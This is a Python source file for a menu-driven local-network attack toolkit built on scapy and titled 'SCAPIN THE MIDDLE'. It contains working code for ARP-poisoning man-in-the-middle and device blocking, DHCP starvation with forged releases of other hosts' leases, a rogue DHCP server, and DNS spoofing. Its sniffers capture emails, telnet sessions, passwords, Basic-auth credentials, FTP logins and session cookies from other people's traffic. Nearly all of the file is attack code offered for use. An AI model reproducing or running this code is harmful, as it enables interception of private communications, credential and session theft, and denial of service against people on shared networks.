#!/usr/bin/env python

# apt-get install python-netaddr
# apt-get install python-netifaces
# apt-get install scapy

from scapy.all import *
from time import sleep
import os
import threading
import sys
import logging
import netaddr
import netifaces
import re
import base64
import netaddr
import netifaces
from time import ctime

dhcp_name_server = ""
log_path = "/tmp/"
menu_message = ""
conf.checkIPaddr = False

actifs = {
	'arp_mitm' : None,
	'arp_block': None,
	'DHCP_exhaust' : None,
	'DHCP_server': None,
	'DNS_spoof' : None,
	'mail_sniff': None,
	'telnet_sniff': None,
	'authentication_sniff':None,
}
def mysniff(count=0, store=0, offline=None, prn = None, lfilter=None, L2socket=None, timeout=None, stopper=None,opened_socket=None, stop_filter=None, *arg, **karg):
	c = 0 
	if opened_socket is not None:
		s = opened_socket
	else:
		if offline is None:
			if L2socket is None:
				L2socket = conf.L2listen
			s = L2socket(type=ETH_P_ALL, *arg, **karg)
		else:
			s = PcapReader(offline)
	lst = []
	if timeout is not None:
		stoptime = time.time()+timeout
	remain = None
	while 1:
		try:
			if stop_filter and stop_filter():
				break
			if timeout is not None:
				remain = stoptime-time.time()
				if remain <= 0:
					break
			sel = select([s],[],[],remain)
			if s in sel[0]:
				p = s.recv(MTU)
				if p is None:
					break
				if lfilter and not lfilter(p):
					continue
				c += 1
				if prn:
					r = prn(p)
					if r is not None:
						print r
				if count > 0 and c >= count:
					break
		except KeyboardInterrupt:
			break
	if opened_socket is None:
		s.close()
	return plist.PacketList(lst,"Sniffed")

class logger():
	global log_path
	@classmethod
	def log(self,msg, path, d=0):
		with open(log_path+path+'.log', 'a') as f:
			f.write(('[' + ctime() + '] ' if d else '') + msg + ('\n' if d else ''))

class authentication_sniff(threading.Thread):

	terminated = False

	# List of keywords used to define if a packet contains credentials
	keywords = ["pass","mail","compte","user","utilisateur","login","log","mdp","pwd","pseudo","admin","root","authorization","cookie"]
	# Telnet data are splited in multiple packets, this variable permit to concatenate data
	telnet_info = ""
	# History of basic auth, used to know if the credentials have been logged or not
	http_basic_auth = []
	# Sessions is a dict used to store the HTTP sessions sniffed on the netowrk, the structure is "ipclient > ipserver:port":"["cookie1";"cookie2"...]
	sessions = {}
	# Extract POST DATA in a POST request from a client
	def find_postdata(self,request) :
		try :
			lines = request.replace("\r","\n").replace("\n\n","\n").split("\n")
			i = 0
			# detection of an empty line, the next line contains the POST DATA
			while i < len(lines) :
				if lines[i].strip() == "" :
					return lines[i+1]
					break
				i += 1
		except :
			return ""
			pass

	# Extract the HTTP method of a request from a client
	def find_method(self,request) :
		try :
			method = re.compile("^([^\ ]+\ )").findall(request)[0].strip()
			return method
		except :
			return ""
			pass

	# Extract the host of a HTTP client request
	def find_host(self,request) :
		try :
			return re.compile('Host: (.*)').findall(request)[0].strip()
		except :
			return ""
			pass

	# Check if the current packet is HTTP or not, based on a method list
	def check_http(self,p) :
		try :
			if any( self.find_method(p[Raw].load) == test for test in ["GET","HEAD","POST","OPTIONS","CONNECT","TRACE","PUT","PATCH","DELETE","HTTP"] ) :
				return p
		except :
			pass

	# Check if the current packet is a FTP authentication by checking if USER or PASS are in the packet
	def check_ftp_auth(self,p) :
		try :
			if any( test in p[Raw].load for test in ["USER","PASS"] ) :
				return p
		except :
			pass

	# Used in the sniff call, permit to detect if the packet could potentialy contains some informations
	def is_good(self,p) :
		if p.haslayer(TCP) and p.haslayer(Raw) :
			# Check if it's a telnet communication
			if p[TCP].sport == 23 or p[TCP].dport == 23 :
				return 1
			# Else we try to find some credentials based on the keywords list
			else :
				try :
					if any( test in p[Raw].load.lower() for test in self.keywords ) :
						return 1
				except :
					return 0
					pass

	# If the packet is selected by is_good function, sniff will call this function
	def handle(self,p):
		# prefix apply on the informations which need to be logged
		base_http_output = " ("+self.find_host(p[Raw].load)+"), "
		base_ftp_output = ", FTP auth - "
		base_telnet_output = ", telnet auth - "
		# output will contains string data if we found some interesting informations in the packet, when output is not empty, it's logged
		output = ""
		if self.check_http(p) :
			# if it's a HTTP packet if POST Data
			if self.find_method(p[Raw].load) == "POST" :
				# POST data are pushed in the data array
				try :
					data = self.find_postdata(p[Raw].load).split("&")
					i = 0
					# extract POST Data in the array which contains a keyword
					while i < len(data) :
						for word in self.keywords :
							if word in data[i].lower() :
								# If a keyword is matched, the data are pushed in the output variable to display the result in the log
								output += data[i].replace("=",":")+" "
								break
						i += 1
				except :
					pass
				# If output has been modified we add the HTTP informations before the output
				if output != "" : output = base_http_output+"POST auth : "+output
			
			# Check if the packet contains a HTTP Basic Auth
			if "Authorization: Basic " in p[Raw].load :
				try :
					# extract credentials and decode them in base64
					auth = base64.decodestring(re.compile("Authorization: Basic (.*)").findall(p[Raw].load)[0])
					# check if the credentials have been already handled
					if not any( test == auth for test in self.http_basic_auth ) :
						# push credentials in the history array
						self.http_basic_auth += [auth]
						# add HTTP informations before credentials
						output = base_http_output+"Basic auth : "+auth

				except :
					pass

			# Check if the request contains a cookie
			if re.compile("[Set-]*Cookie:\ (.*)").findall(p[Raw].load) :
				# check if it's a GET HTTP request
				if re.compile("GET\ [^\ ]*\ HTTP\/[0-9]\.[0-9]").findall(p[Raw].load) :
					# cookies contains all cookies sorted of the request except cookies which start with _
					cookies_found = re.compile("Cookie:\ (.*)").findall(p[Raw].load)[0].replace("\r","").replace("\n","").replace(" ","")
					cookies = sorted([c for c in cookies_found.split(";") if not re.compile("^_").findall(c)])
					# session is the key in the sessions dict to identify HTTP sessions ( ipclient > ipsrv:port )
					try : session = p[IP].src+" > "+p[IP].dst+":"+str(p[TCP].dport) 
					except : session = p[IPv6].src+" > "+p[IPv6].dst+":"+str(p[TCP].dport)
					# check if this sesion is in the Sessions array
					if session in self.sessions :
						# check if the cookies changed
						if self.sessions[session] != cookies :
							# Push the cookies in the session array, set the new cookies in the output variable with the HTTP prefix
							self.sessions[session] = cookies
							output = base_http_output+"Cookie modified : "+";".join(self.sessions[session])
					# else, the session dosen't exists
					elif len(cookies) > 0 :
						# the session is added in the array with the cookies
						self.sessions[session] = cookies
						# set the new sessions and cookies in the ouput variable with the HTTP data profix
						output = base_http_output+"New cookie : "+";".join(cookies)

		# The packet is not HTTP, try to find FTP credentials
		elif self.check_ftp_auth(p) :
			if p[TCP].dport == 21:
				if "USER" in p[Raw].load :
					try :
						# match User in the packet
						output = base_ftp_output+"User : "+re.compile("USER\ (.*)").findall(p[Raw].load)[0][:-1]
					except :
						pass
				elif "PASS" in p[Raw].load :
					try :
						# match Pass in the packet
						output = base_ftp_output+"Password : "+re.compile("PASS\ (.*)").findall(p[Raw].load)[0][:-1]
					except :
						pass

		# Try to find telnet Data
		else :
			# If the packet comes from the server
			if p[TCP].sport == 23 :
				# Get the last line of the server message
				lines = p[Raw].load.replace("\r","\n").replace("\n\n","\n").split("\n")
				# If the last line contains a keyword, add matched word in telnet_info
				if any( test in lines[len(lines)-1].lower() for test in self.keywords ) :
					self.telnet_info = lines[len(lines)-1]
			# If the packet comes from the client
			elif p[TCP].dport == 23 :
				# If telnet_info is not empty, it means that a keywords has bean detected, we will potentialy have a response from the client
				if self.telnet_info != "" :
					# If the client press enter, add telnet_info and telnet base in the output variable
					if "\r" in p[Raw].load or "\n" in p[Raw].load :
						output = base_telnet_output+self.telnet_info
						self.telnet_info = ""
					# else, add the data found in the packet in telnet_info
					else :
						if "7f" == p[Raw].load.encode("hex") : self.telnet_info += "<backspace>"
						else : self.telnet_info += p[Raw].load
							
		# If output has been fill, log the output variable data
		if output != "" :
			try :
				src = p[IP].src
				dst = p[IP].dst+":"+str(p[TCP].dport)
			except :
				src = p[IPv6].src
				dst = p[IPv6].dst+":"+str(p[TCP].dport)
			logger.log(src+" => "+dst +" "+output, "authent", 1)

	def is_stopped(self):
		return self.terminated
	def start_attack(self):
		# Sniff all TCP packets, if packet is good, the packet is handled
		logger.log("Authentication sniff started", "authent", 1)
		mysniff(filter = "tcp", lfilter=self.is_good, prn=self.handle, stop_filter=self.is_stopped)

		logger.log("Authentication sniff stopped", "authent", 1)
	def run(self):
		self.terminated = False
		getattr(authentication_sniff, 'start_attack')(self)
	def stop(self):
		self.terminated = True		

	
class dhcp_exhaust(threading.Thread):
	terminated = False
	def is_stopped(self):
		return self.terminated
	def get_ipinfo(self,interface):
		addrs 	= netifaces.ifaddresses(interface)
		ipinfo 	= addrs[socket.AF_INET][0]
		macinfo = addrs[netifaces.AF_LINK][0]
		ipaddr 	= ipinfo['addr']
		macaddr = macinfo['addr']
		netmask = ipinfo['netmask']
		iplist = ipaddr.split('.')
		iplist[3] = '1'
		ipaddr = '.'.join(iplist)
		cidr = netaddr.IPNetwork('%s/%s' %(ipaddr,netmask))
		return str(cidr)
	
	def start_attack(self):
		global dhcp_name_server

		m = str(RandMAC())
		ans = False
		logger.log("DHCP exhaustion started - ", "dhcp", 1)
		#Send a first discover to get IP & Mac of the real DHCP + DNS IP
		while not ans:
			logger.log("Sending discover to gather real info ", "dhcp", 1)
			dhcp_discover = Ether(src=m, dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0", dst="255.255.255.255")/UDP(sport=68,dport=67)/\
			BOOTP(chaddr=[mac2str(m)],xid=random.randint(0,0xFFFF))/DHCP(options=[("message-type","discover"),"end"])
			ans,unans = srp(dhcp_discover, verbose=0, timeout=5)

			if ans:
				gw_addr = ans[0][1][IP].src
				gw_mac = ans[0][1].src
				dhcp_name_server="8.8.8.8"
				#dhcp_name_server=[x[1] for x in ans[0][1].getlayer(DHCP).options if x[0] == 'name_server'][0]
				logger.log("DHCP found: " + gw_addr + " ("+ gw_mac + ") Nameserver : " + dhcp_name_server,  "dhcp", 1)

		cidr = self.get_ipinfo(conf.iface)
		#Scan the network to get a Mac:IP association
		ans,unans=arping(cidr,verbose=0)
		ip_addr = [f[1].psrc for f in ans]
		mac_addr = [f[1].hwsrc for f in ans] 

		logger.log("Releasing hosts up :", "dhcp", 1)
		# DHCP RELEASE to hosts found
		for ip_up,mac_up in zip(ip_addr, mac_addr):
			dhcp_release = Ether(src=mac_up,dst=gw_mac)/IP(src=ip_up,dst=gw_addr)/UDP(sport=68,dport=67)/\
	BOOTP(ciaddr=ip_up,chaddr=[mac2str(mac_up)])/DHCP(options=[("message-type","release"),"end"])
			sendp(dhcp_release,verbose=0)
			logger.log("[+] "+ip_up+"("+mac_up+") RELEASED", "dhcp", 1)
		#While the real DHCP answers, send discovers
		while not self.terminated:
			m = str(RandMAC())
			xid=random.randint(0,0xFFFF)
			dhcp_discover = Ether(src=m, dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0", dst="255.255.255.255")/UDP(sport=68,dport=67)/\
			BOOTP(chaddr=[mac2str(m)],xid=xid)/DHCP(options=[("message-type","discover"),"end"])
			ans,unans = srp(dhcp_discover, verbose=0, timeout=10)
			logger.log("[+] DHCP Discover sent", 'dhcp', 1)
			if ans:
				packet 	  = ans[0][1][DHCP].options[0][1] 
				req_addr  = ans[0][1][BOOTP].yiaddr	
				ip_server = ans[0][1][BOOTP].siaddr
				#Send requests if there is an offer
				if packet == 2:
					logger.log("[*] DHCP OFFER detected from "+ip_server, 'dhcp', 1)
					logger.log("[+] Requesting the address "+req_addr, 'dhcp', 1)
					host_name=''.join(random.choice("azertyuiopqsdfghjklmwxcvbn") for x in range(5))
					dhcp_request = Ether(src=m,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/\
					BOOTP(chaddr=[mac2str(m)],xid=xid)/DHCP(options=[("message-type","request"),("requested_addr",req_addr),("hostname",host_name),"end"])
					ans,unans = srp(dhcp_request,verbose=0,timeout=5)
					packet = ans[0][1][DHCP].options[0][1] 
			
				#no response from DHCP = attack successful
				else:
					logger.log("[-] No OFFER found - The DHCP is probably full", "dhcp", 1)
			else:
				logger.log("[-] No response from DHCP server", "dhcp", 1)
				logger.log("[ ] DHCP Exhaustion stopped", "dhcp", 1)
				self.terminated = True;
				pass
	def run(self):
		self.terminated = False
		getattr(dhcp_exhaust, 'start_attack')(self)
	def stop(self):
		self.terminated = True	
class dhcp_server(threading.Thread):
	global dhcp_name_server
	terminated = False
 	client_num = 0
 	log = ""
 	server_ip = netifaces.ifaddresses(conf.iface)[socket.AF_INET][0]['addr']
 	if dhcp_name_server == "":
		dns_server = "8.8.8.8" #netifaces.ifaddresses(conf.iface)[socket.AF_INET][0]['addr']
	else:
		dns_server = dhcp_name_server
	server_mac = netifaces.ifaddresses(conf.iface)[17][0]['addr']
	server_ip  = netifaces.ifaddresses(conf.iface)[socket.AF_INET][0]['addr']
	subnet_mask = netifaces.ifaddresses(conf.iface)[socket.AF_INET][0]['netmask']
	gateway = netifaces.ifaddresses(conf.iface)[socket.AF_INET][0]['addr']
	addrs_list = []
	#build the list of IP of our subnet
	[addrs_list.append('%s'%ip) for ip in netaddr.IPNetwork(netaddr.IPNetwork('%s/%s' %(server_ip,subnet_mask))).iter_hosts() if ('%s'%ip) != server_ip] 
	def dhcp(self,p):
		packet = p[DHCP].options[0][1]
		client_ip=self.addrs_list[self.client_num] 
		#Send DHCP OFFER if DHCP DISCOVER is detected
		if packet == 1:
			logger.log("[*]DHCP Discover detected from "+p.src, "dhcp", 1)
			dhcp_offer=Ether(src=self.server_mac,dst="\xff\xff\xff\xff\xff\xff")/IP(src=self.server_ip,dst="255.255.255.255")/UDP(sport=67,dport=68)/\
			BOOTP(op=2, yiaddr=client_ip, siaddr=self.server_ip, chaddr=[mac2str(p.src)], xid=p[BOOTP].xid)/\
			DHCP(options=[("message-type","offer")])/DHCP(options=[("subnet_mask",self.subnet_mask)])/DHCP(options=[("server_id",self.server_ip)])/\
			DHCP(options=[("lease_time", 42000)])/\
			DHCP(options=[("name_server",self.dns_server)])/DHCP(options=[("router",self.gateway),"end"])
			sendp(dhcp_offer, count=1, verbose=0)
			logger.log("[*]DHCP Offer sent to "+p.src, "dhcp", 1)
		#Send DHCP ACK if DHCP REQUEST is detected
		elif packet == 3:
			logger.log("[*]DHCP Request received from "+p.src, "dhcp", 1)
			dhcp_ack = Ether(src=self.server_mac,dst="\xff\xff\xff\xff\xff\xff")/IP(src=self.server_ip,dst="255.255.255.255")/UDP(sport=67,dport=68)/\
			BOOTP(op=2, yiaddr=client_ip, siaddr=self.server_ip, chaddr=[mac2str(p.src)], xid=p[BOOTP].xid)/\
			DHCP(options=[("message-type","ack")])/DHCP(options=[("subnet_mask",self.subnet_mask)])/DHCP(options=[("server_id",self.server_ip)])/\
			DHCP(options=[("lease_time", 42000)])/\
			DHCP(options=[("name_server",self.dns_server)])/DHCP(options=[("router",self.gateway),"end"])
			sendp(dhcp_ack,verbose=0)
			self.client_num+=1
			logger.log("[*]DHCP Ack sent to "+p.src, "dhcp", 1)
			logger.log("[+]"+p.src+" has "+client_ip, "dhcp" ,1)

	def has_bootp(self,p):
		return p.haslayer(BOOTP)
	def is_stopped(self):
		return self.terminated
	def start_server(self):
		self.terminated = False
		logger.log("DHCP Server started", "dhcp", 1)
		mysniff(lfilter=self.has_bootp, prn=self.dhcp, stop_filter=self.is_stopped)
		logger.log("DHCP Server stopped", "dhcp", 1)
	def run(self):
		self.terminated = False
		getattr(dhcp_server, 'start_server')(self)
	def stop(self):
		self.terminated = True		
class telnet_sniff(threading.Thread):
	client_server_assoc = []
	terminated = False
	def detect(self,p):
		if p.haslayer(TCP) and p.haslayer(Raw):
			return p.getlayer(TCP).sport == 23
   
	def extract(self,p):
	    log = False
	    # If the content of client_server_assoc change, another client is connected.
	    if self.client_server_assoc != [p.getlayer(IP).src, p.getlayer(IP).dst] :
	        self.client_server_assoc = [p.getlayer(IP).src, p.getlayer(IP).dst]
	        log = True
	    # If another client is connected, log the data.
	    if log: logger.log("TELNET : " + p.getlayer(IP).dst + "(Client) > " + p.getlayer(IP).src + "(Serveur)","telnet", 1) 
	    logger.log(p.getlayer(Raw).load, "telnet", 0)
	def is_stopped(self):
		return self.terminated
	def start_sniff(self):
		logger.log("Telnet sniff started", "telnet", 1)
		mysniff(count=0, filter="tcp", lfilter=self.detect, prn=self.extract, store=0, stop_filter=self.is_stopped)
		logger.log("Telnet sniff stopped", "telnet", 1)
	def run(self):
		self.terminated = False
		getattr(telnet_sniff, 'start_sniff')(self)
	def stop(self):
		self.terminated = True
class mail_sniff(threading.Thread):
	terminated = False	
	packet_number = 0 
	data = ""
	# Check if the packet match to a sent email.
	def detect(self,p):
	    if p.haslayer(TCP) and p.haslayer(Raw) :
	        if p.getlayer(TCP).dport == 25 :
	            return p
	def parsing(self,p):
	    # If Message-ID is match, it's the beginning of the email.
	    src = re.findall('Message-ID:', p.getlayer(Raw).load)
	    if len(src) != 0 : self.packet_number += 1
	    
	    # If the load of the Raw packet equal "QUIT" the email is complete.
	    if self.packet_number != 0 : 
	        if p.getlayer(Raw).load == 'QUIT\r\n' : self.packet_number = -1
	    # When packet_number is equal or greater than 1, the load is concatenate to rebuild the email text.
	    if self.packet_number >= 1 : self.data += p.getlayer(Raw).load
	    # When the packet_number is equal to -1, the email is complete and sent to the log function with the source IP.
	    elif self.packet_number == -1 :
	        try    : ip = p.getlayer(IP).src
	        except : ip = p.getlayer(IPv6).src
	        logger.log(" New mail from " + p.getlayer(IP).src + " : \n" + self.data, "mail", 1)
	        # Reset the variable to be ready to intercept a new email.
	        self.data = ""
	        self.packet_number = 0
	def is_stopped(self):
		return self.terminated
	def start_sniff(self):
		self.terminated = False
		mysniff(filter="tcp", lfilter=self.detect, prn=self.parsing, stop_filter=self.is_stopped)
	def run(self):
		getattr(mail_sniff, 'start_sniff')(self)
		#sniff(count=1, filter = "tcp", lfilter=self.detect_fragment, prn=self.parsing, store=0)
	def stop(self):
		self.terminated = True		
class dns_spoof(threading.Thread):
	joker = ""
	terminated = False
	def is_request(self, p):
		return p.haslayer(DNS) and p.getlayer(DNS).qr ==0
	def answer(self, req):
		ip = req.getlayer(IP)
		dns = req.getlayer(DNS)
		#if the domain matches the input domain, send a fake answer
		if self.domain in dns.qd.qname:
			resp = IP(dst=ip.src, src=ip.dst)/UDP(dport=ip.sport,sport=ip.dport)
			resp /= DNS(id=dns.id, qr=1, qd=dns.qd,an=DNSRR(rrname=dns.qd.qname, ttl=10, rdata=self.joker))
			logger.log("DNS spoof: " + dns.qd.qname + " / " + self.joker, "mitm",1)
			send(resp,verbose=0)	
	def is_stopped(self):
		return self.terminated
	def start_spoof(self):
		logger.log("Dns spoof started", "mitm", 1)
		mysniff(stop_filter=self.is_stopped, prn=self.answer, lfilter=self.is_request, filter="udp port 53")
		logger.log("Dns spoof stopped", "mitm", 1)
	def __init__(self,domain,joker=None):
		threading.Thread.__init__(self)	
		self.joker = joker
		self.domain = domain
	def run(self):
		getattr(dns_spoof,'start_spoof')(self)
	def stop(self):
		self.terminated = True
		
class arp_poison(threading.Thread):
	ip = ""
	gw = ""
	terminated = False
	attack = ""
	def single_poison(self,ip, gw):
		self.mac = getmacbyip(ip)
		#if we can get the mac the of victim, send fake ARP who-has
		if self.mac is not None:
			logger.log("ARP single poison started : " + self.ip + " (" + self.mac +") GW: " + self.gw + " (FAKED: " + self.mymac + ")", "mitm", 1)
			while self.terminated != True:	
				p1=Ether(dst=self.mac)/ARP(op="who-has", psrc=gw, pdst=ip)
				sendp(p1,count=1,verbose=0)
				sleep(5)
		else:
			self.terminated = True
			logger.log("ARP single poison FAILED to determine Mac address", "mitm", 1)
	def range_poison(self, ip_range, gw):
		#scan the network for the given range. (to prevent sending ARP to unknown hosts)
		client_list = [(t[1][ARP].psrc,t[1][ARP].hwsrc) for t in arping(ip_range,verbose=0)[0]]
		logger.log("ARP range poison started: " + self.ip + " GW: " + self.gw + " (FAKED: " + self.mymac + ")", "mitm", 1)
		for client in client_list:
			logger.log(client[0] + " - " + client[1],"mitm", 1)
		while not self.terminated:
			for client in client_list:
				p1 = Ether(dst=client[0])/ARP(op="who-has", psrc=gw, pdst=client[0])
				sendp(p1, verbose=0)
			sleep(5)
	def __init__(self, ip, gw=[g[2] for g in conf.route.routes if g[2] != "0.0.0.0"][0]):
		threading.Thread.__init__(self)	
		os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
		self.terminated = False
		self.ip = ip
		self.gw = gw			
		self.mymac = netifaces.ifaddresses(conf.iface)[netifaces.AF_LINK][0]['addr']

	def run(self):
		# if "-" in the IP given: it's a range.
		if "-" in self.ip:
			getattr(arp_poison, 'range_poison')(self,self.ip,self.gw)
		else:
			getattr(arp_poison,'single_poison')(self,self.ip,self.gw)
	def stop(self):
		logger.log("ARP poison stopped", "mitm", 1)
		self.terminated = True

class arp_block(threading.Thread):
	#Everything here is the same as arp_poison, except the fake mac sent.
	def __init__(self,ip,gw):
		threading.Thread.__init__(self)	
		self.terminated = False
		self.ip = ip
		self.gw = gw
		self.mymac = netifaces.ifaddresses(conf.iface)[netifaces.AF_LINK][0]['addr']
	def single_block(self,ip,gw):
		self.mac = getmacbyip(ip)
		if self.mac is not None:
			logger.log("ARP single block started : " + ip + "(" + self.mac +") GW: " + gw + "(FAKED:" + self.mymac + ")", "mitm", 1)
			while not self.terminated:
				p = Ether(dst=self.mac, src="11:11:11:11:11:11")/ARP(op="who-has", hwsrc="11:11:11:11:11:11", psrc=gw, pdst=ip,hwdst=self.mac)
				sendp(p,count=1,verbose=0)
				sleep(5)
		else:
			self.terminated = True
			logger.loger("ARP single block FAILED to determine Mac address", "mitm", 1)
	def range_block(self,ip_range,gw):
		logger.log("ARP range block started: " + ip_range + " GW: " + gw + " (FAKED:" + self.mymac + ")", "mitm", 1)
		client_list = [(t[1][ARP].psrc,t[1][ARP].hwsrc) for t in arping(ip_range,verbose=0)[0]]
		for client in client_list:
			logger.log(client[0] + " - " + client[1],"mitm", 1)
		while not self.terminated:
			for client in client_list:
				p1 = Ether(dst=client[0],src="11:11:11:11:11:11")/ARP(op="who-has", psrc="11:11:11:11:11:11", pdst=client[0])
				sendp(p1, verbose=0)
			sleep(5)
	def run(self):
		if "-" in self.ip:
			getattr(arp_block, 'range_block')(self,self.ip,self.gw)
		else:
			getattr(arp_block,'single_block')(self,self.ip,self.gw)
	def stop(self):
		self.terminated = True
class menu:	
	global actifs
	@classmethod
	def show(self, msg=""):
		#print the last message if there is one. (messages are in a list)
		global menu_message
		if msg != "":
			for m in msg:
				print "[+] "+ m
		print
		print "1. Arp spoof - MITM\t\t",

		#print '\033[31mOFF\033[37m' if actifs['arp_mitm'] == None else '\033[32mON\033[37m'
		print 'OFF' if actifs['arp_mitm'] == None else 'ON'
		print "2. Arp spoof - Block Device\t",

		#print '\033[31mOFF\033[37m' if actifs['arp_block'] == None else '\033[32mON\033[37m'
		print 'OFF' if actifs['arp_block'] == None else 'ON'
		print "3. DHCP Exhaustion\t\t",

		#print '\033[31mOFF\033[37m' if actifs['DHCP_exhaust'] == None else '\033[32mON\033[37m'
		print 'OFF' if actifs['DHCP_exhaust'] == None else 'ON'
		print "4. DHCP Server\t\t\t",

		#print '\033[31mOFF\033[37m' if actifs['DHCP_server'] == None else '\033[32mON\033[37m'
		print 'OFF' if actifs['DHCP_server'] == None else 'ON'
		print "5. DNS Spoof\t\t\t",

		#print '\033[31mOFF\033[37m' if actifs['DNS_spoof'] == None else '\033[32mON\033[37m'
		print 'OFF' if actifs['DNS_spoof'] == None else 'ON'
		print "6. Mail Sniff\t\t\t",

		#print '\033[31mOFF\033[37m' if actifs['mail_sniff'] == None else '\033[32mON\033[37m'
		print 'OFF' if actifs['mail_sniff'] == None else 'ON'
		print "7. Telnet Session Sniff\t\t",

		#print '\033[31mOFF\033[37m' if actifs['telnet_sniff'] == None else '\033[32mON\033[37m'
		print 'OFF' if actifs['telnet_sniff'] == None else 'ON'
		print "8. Authentication Sniff\t\t",

		#print '\033[31mOFF\033[37m' if actifs['authentication_sniff'] == None else '\033[32mON\033[37m'
		print 'OFF' if actifs['authentication_sniff'] == None else 'ON'
		print "#. .."
		print "0. Exit"
		try:
			{
				1: self.arp_mitm,
				2: self.arp_block_device,
				3: self.dhcp_exhaust,
				4: self.dhcp_serv,
				5: self.dns_spoof,
				6: self.mail_sniff,
				7: self.telnet_sniff,
				8: self.authentication_sniff,
				0: self.exit
			}.get(input("> "))()
		except Exception as e:
			menu_message= ["ERREUR DE SAISIE !", str(e)]
			pass
	@classmethod
	def exit(self):
	#own exit method to terminate all on-going attacks
		for attackThread in actifs:
			if actifs[attackThread] is not None:
				actifs[attackThread].terminated = True
		sys.exit()
	@classmethod
	def dns_spoof(self):
	#interactive parmaters retrieving
		global menu_message
		if actifs['DNS_spoof'] == None:
			menu_message = ["DNS Spoof started !", "Log path: "+ log_path + "mitm.log"]
			domain = raw_input("Domain to spoof\n\t> ")
			joker = raw_input("IP Address to redirect to\n\t> ")
			m = dns_spoof(domain,joker)
			m.start()
			actifs['DNS_spoof'] = m
		else:
			menu_message = ["DNS Spoof stopped !"]
			actifs['DNS_spoof'].stop()
			actifs['DNS_spoof'] = None
	@classmethod
	def dhcp_exhaust(self):
		global menu_message
		if actifs['DHCP_exhaust'] == None:	
			menu_message = ["DHCP Exhaustion started ! (Stopping this attack has no effect)", "File log: " + log_path + "dhcp.log"]
			m = dhcp_exhaust()
			m.start()
			actifs['DHCP_exhaust'] = m
		else:
			menu_message = ["DHCP Exhaustion stopped! (The server may alread be full)"]
			actifs['DHCP_exhaust'].stop()
			actifs['DHCP_exhaust'] = None
	@classmethod
	def dhcp_serv(self):
		global menu_message
		if actifs['DHCP_server'] == None:	
			menu_message = ["DHCP Server started !", "File log: " + log_path + "dhcp.log"]
			m = dhcp_server()
			m.start()
			actifs['DHCP_server'] = m
		else:
			menu_message = ["DHCP Server stopped !"]
			actifs['DHCP_server'].stop()
			actifs['DHCP_server'] = None
	@classmethod
	def authentication_sniff(self):
		global menu_message
		if actifs['authentication_sniff'] == None:
			menu_message = ["Authentication sniff started !", "File log: " + log_path + "authent.log"]
			m = authentication_sniff()
			m.start()
			actifs['authentication_sniff'] = m
		else:
			menu_message = ["Authentication sniff stopped !"]
			actifs['authentication_sniff'].stop()
			actifs['authentication_sniff'] = None
	@classmethod
	def telnet_sniff(self):
		global menu_message
		if actifs['telnet_sniff'] == None:
			menu_message = ["Telnet session sniff started !", "File log: " + log_path + "telnet.log"]
			m = telnet_sniff()
			m.start()
			actifs['telnet_sniff'] = m
		else:
			menu_message = ["Telnet session sniff stopped !"]
			actifs['telnet_sniff'].stop()
			actifs['telnet_sniff'] = None
	@classmethod
	def mail_sniff(self):
		global menu_message
		if actifs['mail_sniff'] == None:
			menu_message = ["Mail sniff started !", "File log: " + log_path + "mail.log"]
			m = mail_sniff()
			m.start()
			actifs['mail_sniff'] = m
		else:
			menu_message = ["Mail sniff stopped !"]
			actifs['mail_sniff'].stop()
			actifs['mail_sniff'] = None	
	@classmethod
	def arp_mitm(self):
	#interactive parameters retrieving

		global menu_message
		if actifs['arp_mitm'] == None:
			target_ip = raw_input("Target IP (ex:192.168.1.1) or Range (ex:192.168.1.1-10):\n\t> ")
			gw = [g[2] for g in conf.route.routes if g[2] != "0.0.0.0"][0]
			m = arp_poison(target_ip, gw)
			m.start()
			actifs['arp_mitm'] = m
			menu_message = ["ARP poisoning started !", "File log: " + log_path + "mitm.log"]
		else:
			menu_message = ["ARP poisoning stopped !"]
			actifs['arp_mitm'].stop()
			actifs['arp_mitm'] = None

	@classmethod
	def arp_block_device(self):
	#interactive parameters retrieving
		global menu_message
		if actifs['arp_block'] == None:
			ip = raw_input("Target IP: ")
			gw = [g[2] for g in conf.route.routes if g[2] != "0.0.0.0"][0]
			m = arp_block(ip,gw)
			m.start()
			actifs['arp_block'] = m
			menu_message = ["ARP device blocking started !", "File log: " + log_path + "mitm"]
		else:
			actifs['arp_block'].stop()
			actifs['arp_block'] = None
			menu_message = ["ARP device blocking stopped !"]
if __name__ == "__main__":
#if the script is running on its own, show the menu
	global menu_message
	menu_message = ["Welcome to SCAPIN THE MIDDLE !"]
	while 1:
		os.system("clear")
		menu.show(msg=menu_message);
